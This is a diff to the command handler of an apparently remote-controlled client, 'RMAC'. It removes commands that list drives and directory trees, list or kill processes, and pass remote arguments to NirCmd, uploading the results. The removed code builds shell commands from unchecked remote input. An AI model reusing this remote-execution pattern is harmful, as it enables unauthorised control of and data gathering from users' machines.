@@ -5,7 +5,6 @@ import com.rmac.utils.ArchiveFileType;
 import com.rmac.utils.Constants;
 import com.rmac.utils.Utils;
 import java.io.IOException;
-import java.io.PrintStream;
 import java.util.Objects;
 import lombok.extern.slf4j.Slf4j;
 
@@ -107,38 +106,6 @@ public class CommandHandler {
             System.exit(0);
             break;
           }
-          case "drive": {
-            String[] parts = currCommand.split(" ");
-            if (parts.length < 2) {
-              log.warn("Invalid command '" + currCommand + "'");
-              continue;
-            }
-            String subCommand = parts[1].trim().toLowerCase();
-            if (subCommand.equals("list")) {
-              String[] roots = RMAC.fs.getRoots();
-              String fileName =
-                  Constants.RUNTIME_LOCATION + "\\DriveDetails-" + Utils.getTimestamp() + ".txt";
-              PrintStream fileRoots = RMAC.fs.getPrintStream(fileName);
-              for (String root : roots) {
-                fileRoots.println(root);
-              }
-              fileRoots.close();
-              RMAC.uploader.uploadFile(fileName, ArchiveFileType.OTHER);
-            } else if (subCommand.equals("tree")) {
-              if (parts.length < 3) {
-                log.warn("Invalid command '" + currCommand + "'");
-                continue;
-              }
-              String arg1 = parts[2].trim().toLowerCase();
-              String fileName =
-                  Constants.RUNTIME_LOCATION + "\\Tree-" + Utils.getTimestamp() + ".txt";
-              Process proc = Runtime.getRuntime()
-                  .exec("tree " + arg1 + ":\\ /f /a > \"" + fileName + "\"");
-              proc.waitFor();
-              RMAC.uploader.uploadFile(fileName, ArchiveFileType.OTHER);
-            }
-            break;
-          }
           case "fetch": {
             String filePath = currCommand.substring(currCommand.indexOf(' ') + 1);
             if ("".equals(filePath) || !currCommand.contains(" ")) {
@@ -161,35 +128,6 @@ public class CommandHandler {
             if ("shutdown".equals(args[1])) {
               System.exit(0);
             }
-            break;
-          }
-          case "process": {
-            String[] args = currCommand.split(" ");
-            if (args.length < 2) {
-              log.warn("Invalid command '" + currCommand + "'");
-              continue;
-            }
-            if ("list".equals(args[1])) {
-              String fileName =
-                  Constants.RUNTIME_LOCATION + "\\TaskList-" + Utils.getTimestamp() + ".txt";
-              Process proc = Runtime.getRuntime().exec("tasklist > \"" + fileName + "\"");
-              proc.waitFor();
-              RMAC.uploader.uploadFile(fileName, ArchiveFileType.OTHER);
-            } else if ("kill".equals(args[1])) {
-              if (args.length < 3) {
-                log.warn("Invalid command '" + currCommand + "'");
-                continue;
-              }
-              Runtime.getRuntime().exec("taskkill /f /pid " + args[2]);
-            }
-            break;
-          }
-          case "nircmd": {
-            if (!currCommand.contains(" ")) {
-              continue;
-            }
-            String nirCommand = currCommand.substring(currCommand.indexOf(' ') + 1);
-            Runtime.getRuntime().exec(Constants.NIRCMD_LOCATION + " " + nirCommand);
             break;
           }
           case "cam": {
